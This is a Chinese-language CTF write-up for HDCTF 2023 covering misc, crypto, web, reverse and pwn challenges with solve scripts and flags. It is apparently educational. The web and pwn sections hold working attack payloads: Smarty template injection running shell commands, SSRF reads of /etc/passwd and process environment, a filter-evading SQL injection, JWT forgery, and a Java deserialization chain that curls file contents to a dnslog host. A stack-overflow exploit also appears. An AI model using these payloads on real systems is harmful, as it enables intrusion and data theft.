# HDCTF 2023 WP

> 原文: https://www.ctfiot.com/111656.html
> ID: 111656

RANK：10

 MISC

hardMisc

zsteg得到数据

解base64

HDCTF{wE1c0w3_10_HDctf_M15c}

ExtremeMisc

压缩包常规题型

IDAT.png文件尾分离出来zip

然后是Dic.zip，名字可知用字典爆破

用的rockyou.txt

然后，解两位一组倒序

zip = open('Reverse.piz','rb').read()
zip_reverse = open('reverse.zip','wb')
zip_reverse.write(b''.join([(int(('%02x'%i)[::-1],16)).to_bytes(1,'little')for i in zip]))

然后爆破密码

然后明文攻击

嫌archpr慢，用bkcrack爆破的

MasterMisc

带密码的分卷压缩

用bandizip高版本自带的密码爆破

flag有三部分

topic.png后面有个png，然后还有个wav

在第二个png和wav之间有第三段flag

第二个图片高度有问题，改高后查看得第二个flag

最抽象的是第一个flag

NSSCTF{e67d8104

NSSCTF{e67d8104-7536-4433-bfff-96759901c405}

Normal_Rsa

flag直接放在上面没删

 CRYPTO

Normal_Rsa

出题人忘了删flag了

Normal_Rsa(revenge)

from Crypto.Util.number import *
import libnum
P = 8760210374362848654680470219309962250697808334943036049450523139299289451311563307524647192830909610600414977679146980314602124963105772780782771611415961
Q = 112922164039059900199889201785103245191294292153751065719557417134111270255457254419542226991791126571932603494783040069250074265447784962930254787907978286600866688977261723388531394128477338117384319760669476853506179783674957791710109694089037373611516089267817074863685247440204926676748540110584172821401
n = 12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749
c = 7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785

p_ = libnum.nroot(P,2)
q_ = libnum.nroot(Q,2)

p = libnum.gcd(p_,n)
q = libnum.gcd(q_,n)
r = n//p//q
e=65537
phi = (p-1)*(q-1)*(r-1)
d = libnum.invmod(e,phi)
m = pow(c,d,n)
print(long_to_bytes(m))

# b'HDCTF{08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2}'

爬过小山去看云

山是hill密码

云是云影密码

eight,four,two,one,zero换成84210

云影密码

def de_code(c):
    dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]
    flag = []
    c2 = [i for i in c.split("0")]
    for i in c2:
        c3 = 0
        for j in i:
            c3 += int(j)
        flag.append(dic[c3 - 1])
    return flag

c = "842084210884024084010124"
print("".join(de_code(c)))

# NOTFLAG

差点以为做错了。

NSSCTF{NOTFLAG}

 web

Welcome To HDCTF 2023

看源码找到game.js

找到这一串

放到控制台运行即可

SearchMaster

题目让post提交一个data

随便传一个在页面执行了

当传入{时他会报错，看报错信息发现

Smarty，猜测Smarty的ssti，数据发送到前端

用{if}标签即可

{if phpinfo()}{/if}

可以执行phpinfo()

直接命令执行即可

data={if system('cat /f*')}{/if}

YamiYami

三个链接，点read somethings之后看url

应该是ssrf尝试一下文件读取

?url=file:///etc/passwd

可以读，但不能读flag，尝试读环境变量

?url=file:///proc/1/environ

可以看到flag在环境变量中

LoginMaster

用dirsearch扫目录扫出

/robots.txt

function checkSql($s) 
{
    if(preg_match("/regexp|between|in|flag|=|>|<|and|||right|left|reverse|update|extractvalue|floor|substr|&|;|\$|0x|sleep| /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');

构造一个查询结果是自身的sql语句

https://www.cnblogs.com/aninock/p/16467716.html

1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))
#

JavaMonster

jwt

将admin改成Boogipop解出jwt传入cookie:a=1;b=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODIxNzcxMTgsImlhdCI6MTY4MjE2OTkxOCwidXNlcm5hbWUiOiJCb29naXBvcCJ9.1dfoUuPRgwflPRL8beAumUMOCVFIRCV4yAjXd18Syko

public static void main(String[] args) throws UnsupportedEncodingException {
    com.ctf.easyjava.utils.JwtUtil jwtUtil = new com.ctf.easyjava.utils.JwtUtil();
    User user = new User("Boogipop", "123");
    String token = jwtUtil.JwtCreate(user);
    System.out.println(token);
    System.out.println(jwtUtil.Jwttoken(token));
}

hashcode

USy to solve EasyJava的hash等于Try to solve EasyJava

rome二次反序列化

将结果带入dnslog

package com.ctf.easyjava;

import com.ctf.easyjava.hdctf.HDCTF;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.util.HashMap;
import static com.ctf.easyjava.Tool.*;

public class R_SignedObject {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "cat /flag_is_is_here | while read line; do echo $line.4m7ytd.dnslog.cn | xargs curl; done"});");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap table1 = getPayload(Templates.class, obj);

        HDCTF hdctf = new HDCTF(table1);

        HashMap table2 = getPayload(HDCTF.class, hdctf);
//
        run(table2, "debug", "object");
    }
    public static HashMap getPayload (Class clazz, Object payloadObj) throws Exception{
        EqualsBean bean = new EqualsBean(String.class, "r");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", payloadObj);
        map2.put("zZ", bean);
        map2.put("yy", payloadObj);
        HashMap table = new HashMap();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "_beanClass", clazz);
        setFieldValue(bean, "_obj", payloadObj);
        return table;
    }
}

 REVERSE

easy_re

先脱upx壳

SERDVEZ7WTB1X2hAdjJfL1wvXEA1N2VyM2RfN2hlX3IzdjNyczN9

一眼base64

解码得flag

HDCTF{Y0u_h@v2_//@57er3d_7he_r3v3rs3}

easy_asm

这是数据段

重点就是

 mov cl, 10h
 xor al, cl

异或0x10

HDCTF{Just_a_e3sy_aSm}

fake_game

pyinstxtractor反编译exe

用这个项目的，可以自动帮你补全结构头，不用再修

https://github.com/pyinstxtractor/pyinstxtractor-ng

uncompyle6反编译pyc

关键函数部分

用sage解方程式

如果xorr[3]=2360

解出来的flag不对

HDCUF{G1Od_ql2y2r_f1r_Pwz!!|

反过来根据flag的格式推xorr[3]

print(flag[0]^ord('H'))
print(flag[1]^ord('D'))
print(flag[2]^ord('C'))
print(flag[3]^ord('T'))

可知xorr[3]应为2361

xorr = [178940,248,56890,2361]
ans = [0] * 55
flag =  [178868, 188, 56953, 2413, 178874, 131, 56957, 2313, 178867, 156, 56933, 2377, 178832, 202, 56899, 2314, 178830, 167, 56924, 2313, 178830, 167, 56938, 2383, 178822, 217, 56859, 2372 ]

for i in range(len(flag)):
    ans[i] = flag[i] ^ xorr[(i % 4)]

print("".join([chr(i) for i in ans]))

# HDCTF{G0Od_pl2y3r_f0r_Pvz!!}

买了些什么呢

flag以NSSCTF形式提交，商品的编号从小到大排列(用空格隔开例如NSSCTF{1 2 3 40})即为flag

hint: [HDCTF 2023]买了些什么呢商品下标从0开始

直接交给Claude

n = 40  
capacity = 50  

weights = [2, 5, 10, 9, 3, 6, 2, 2, 6, 8, 2, 3, 3, 2, 9, 8,  
          2, 10, 8, 6, 4, 3, 4, 2, 4, 8, 3, 8, 4, 10, 7, 1,  
          9, 1, 5, 7, 1, 1, 7, 4, 3]
values = [8, 1, 5, 9, 5, 6, 8, 2, 3, 7, 5, 4, 3, 7, 6, 7,  
          9, 3, 10, 5, 2, 4, 5, 2, 9, 5, 8, 10, 2, 9, 6, 3,  
          7, 3, 9, 6, 10, 1, 2, 9, 4]

dp = [[0 for j in range(capacity + 1)] for i in range(n + 1)]

for i in range(1, n + 1):
    for j in range(capacity + 1):
        if weights[i - 1] <= j:
            dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - weights[i - 1]] + values[i - 1],
                           dp[i - 1][j - weights[i - 1]] - values[i - 1])
        else:
            dp[i][j] = dp[i - 1][j]

result = []
j = capacity
for i in range(n, 0, -1):
    if dp[i][j] != dp[i - 1][j]:
        result.append(i)
        j -= weights[i - 1]

print(result[::-1])

结果是

[1, 5, 7, 11, 12, 14, 17, 19, 22, 23, 25, 27, 32, 34, 35, 37, 40]

根据提示改一下

[print(str(i-1),end=' ') for i in result[::-1]]

NSSCTF{0 4 6 10 11 13 16 18 21 22 24 26 31 33 34 36 39}

 PWN

pwnner

from pwn import *
from ctypes import *
context.log_level = 'debug'
r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
close = lambda : p.close()
debug = lambda : gdb.attach(p)
shell = lambda : p.interactive()

# p=process('./pwnner')
p=remote('node6.anna.nssctf.cn',28922)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

libc.srand(0x39)
v0=libc.rand()

sla(b'name:n',str(v0))
pl = b'a'*(64+8) + p64(0x4008B2)
sla(b'next?',pl)

p.interactive()

– END –

长

按

关

注

网络安全社团公众号

微信号 : qlnu_ctf

新浪微博：齐鲁师范学院网络安全社团


```
HDCTF{wE1c0w3_10_HDctf_M15c}
zip = open('Reverse.piz','rb').read()
zip_reverse = open('reverse.zip','wb')
zip_reverse.write(b''.join([(int(('%02x'%i)[::-1],16)).to_bytes(1,'little')for i in zip]))
NSSCTF{e67d8104-7536-4433-bfff-96759901c405}
from Crypto.Util.number import *
import libnum
P = 8760210374362848654680470219309962250697808334943036049450523139299289451311563307524647192830909610600414977679146980314602124963105772780782771611415961
Q = 112922164039059900199889201785103245191294292153751065719557417134111270255457254419542226991791126571932603494783040069250074265447784962930254787907978286600866688977261723388531394128477338117384319760669476853506179783674957791710109694089037373611516089267817074863685247440204926676748540110584172821401
n = 12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749
c = 7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785

p_ = libnum.nroot(P,2)
q_ = libnum.nroot(Q,2)

p = libnum.gcd(p_,n)
q = libnum.gcd(q_,n)
r = n//p//q
e=65537
phi = (p-1)*(q-1)*(r-1)
d = libnum.invmod(e,phi)
m = pow(c,d,n)
print(long_to_bytes(m))

# b'HDCTF{08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2}'
def de_code(c):
    dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]
    flag = []
    c2 = [i for i in c.split("0")]
    for i in c2:
        c3 = 0
        for j in i:
            c3 += int(j)
        flag.append(dic[c3 - 1])
    return flag

c = "842084210884024084010124"
print("".join(de_code(c)))

# NOTFLAG
{if phpinfo()}{/if}
data={if system('cat /f*')}{/if}
?url=file:///etc/passwd
?url=file:///proc/1/environ
function checkSql($s) 
{
    if(preg_match("/regexp|between|in|flag|=|>|<|and|||right|left|reverse|update|extractvalue|floor|substr|&|;|\$|0x|sleep| /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))
#
public static void main(String[] args) throws UnsupportedEncodingException {
    com.ctf.easyjava.utils.JwtUtil jwtUtil = new com.ctf.easyjava.utils.JwtUtil();
    User user = new User("Boogipop", "123");
    String token = jwtUtil.JwtCreate(user);
    System.out.println(token);
    System.out.println(jwtUtil.Jwttoken(token));
}
package com.ctf.easyjava;

import com.ctf.easyjava.hdctf.HDCTF;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.util.HashMap;
import static com.ctf.easyjava.Tool.*;

public class R_SignedObject {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "cat /flag_is_is_here | while read line; do echo $line.4m7ytd.dnslog.cn | xargs curl; done"});");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap table1 = getPayload(Templates.class, obj);

        HDCTF hdctf = new HDCTF(table1);

        HashMap table2 = getPayload(HDCTF.class, hdctf);
//
        run(table2, "debug", "object");
    }
    public static HashMap getPayload (Class clazz, Object payloadObj) throws Exception{
        EqualsBean bean = new EqualsBean(String.class, "r");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", payloadObj);
        map2.put("zZ", bean);
        map2.put("yy", payloadObj);
        HashMap table = new HashMap();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "_beanClass", clazz);
        setFieldValue(bean, "_obj", payloadObj);
        return table;
    }
}
SERDVEZ7WTB1X2hAdjJfL1wvXEA1N2VyM2RfN2hlX3IzdjNyczN9
HDCTF{Y0u_h@v2_//@57er3d_7he_r3v3rs3}
mov cl, 10h
 xor al, cl
HDCTF{Just_a_e3sy_aSm}
HDCUF{G1Od_ql2y2r_f1r_Pwz!!|
print(flag[0]^ord('H'))
print(flag[1]^ord('D'))
print(flag[2]^ord('C'))
print(flag[3]^ord('T'))
xorr = [178940,248,56890,2361]
ans = [0] * 55
flag =  [178868, 188, 56953, 2413, 178874, 131, 56957, 2313, 178867, 156, 56933, 2377, 178832, 202, 56899, 2314, 178830, 167, 56924, 2313, 178830, 167, 56938, 2383, 178822, 217, 56859, 2372 ]

for i in range(len(flag)):
    ans[i] = flag[i] ^ xorr[(i % 4)]

print("".join([chr(i) for i in ans]))

# HDCTF{G0Od_pl2y3r_f0r_Pvz!!}
n = 40  
capacity = 50  

weights = [2, 5, 10, 9, 3, 6, 2, 2, 6, 8, 2, 3, 3, 2, 9, 8,  
          2, 10, 8, 6, 4, 3, 4, 2, 4, 8, 3, 8, 4, 10, 7, 1,  
          9, 1, 5, 7, 1, 1, 7, 4, 3]
values = [8, 1, 5, 9, 5, 6, 8, 2, 3, 7, 5, 4, 3, 7, 6, 7,  
          9, 3, 10, 5, 2, 4, 5, 2, 9, 5, 8, 10, 2, 9, 6, 3,  
          7, 3, 9, 6, 10, 1, 2, 9, 4]

dp = [[0 for j in range(capacity + 1)] for i in range(n + 1)]

for i in range(1, n + 1):
    for j in range(capacity + 1):
        if weights[i - 1] <= j:
            dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - weights[i - 1]] + values[i - 1],
                           dp[i - 1][j - weights[i - 1]] - values[i - 1])
        else:
            dp[i][j] = dp[i - 1][j]

result = []
j = capacity
for i in range(n, 0, -1):
    if dp[i][j] != dp[i - 1][j]:
        result.append(i)
        j -= weights[i - 1]

print(result[::-1])
[1, 5, 7, 11, 12, 14, 17, 19, 22, 23, 25, 27, 32, 34, 35, 37, 40]
[print(str(i-1),end=' ') for i in result[::-1]]
NSSCTF{0 4 6 10 11 13 16 18 21 22 24 26 31 33 34 36 39}
from pwn import *
from ctypes import *
context.log_level = 'debug'
r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
close = lambda : p.close()
debug = lambda : gdb.attach(p)
shell = lambda : p.interactive()

# p=process('./pwnner')
p=remote('node6.anna.nssctf.cn',28922)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

libc.srand(0x39)
v0=libc.rand()

sla(b'name:n',str(v0))
pl = b'a'*(64+8) + p64(0x4008B2)
sla(b'next?',pl)

p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1682215506.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682215507.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1682215508.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682215508.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/1-1682215509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1682215509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1682215510.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1682215510.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1682215510.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1682215511.png)